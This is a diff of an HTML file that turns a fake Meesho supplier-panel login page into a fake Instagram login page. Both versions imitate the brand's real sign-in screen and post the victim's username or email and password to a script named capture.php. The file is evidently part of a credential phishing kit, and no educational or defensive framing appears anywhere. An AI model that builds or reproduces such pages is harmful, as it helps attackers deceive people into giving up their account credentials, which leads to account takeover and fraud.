@@ -3,33 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Panel</title>
+    <title>Instagram Login</title>
     <link rel="stylesheet" href="./style.css">
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <h1>meesho</h1>
+        <h1>Instagram</h1>
+        <form action="./capture.php" method="POST">
+            <input type="text" name="email" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="password" required>
+            <button type="submit">Log in</button>
+        </form>
+        <div class="or">
+            <span>OR</span>
         </div>
-        <div class="login-panel">
-            <h2>Login to your supplier panel</h2>
-             <form  action="./capture.php" method="POST">
-                <div class="form-group">
-                    <input type="text" name="email" placeholder="email Id or mobile number" required>
-                </div>
-                <div class="form-group">
-                    <input type="password" name="password"placeholder="password" required>
-                    <span class="toggle-password">Show</span>
-                </div>
-                <a href="#" class="forgot-password">Forgot password?</a>
-                <button type="submit" class="login-button">Log in</button>
-            </form>
-            <div class="new-account">
-                <hr>
-                <span>New to Meesho?</span>
-                <hr>
-            </div>
-            <button class="create-account-button">Create your supplier account</button>
+        <div class="facebook-login">Log in with Facebook</div>
+        <div class="forgot-password">Forgot password?</div>
+        <div class="signup">
+            Don’t have an account? <a href="#">Sign up</a>
+        </div>
+        <div class="download-links">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Get_it_from_Microsoft_Badge.svg" alt="Get it from Microsoft">
         </div>
     </div>
 </body>
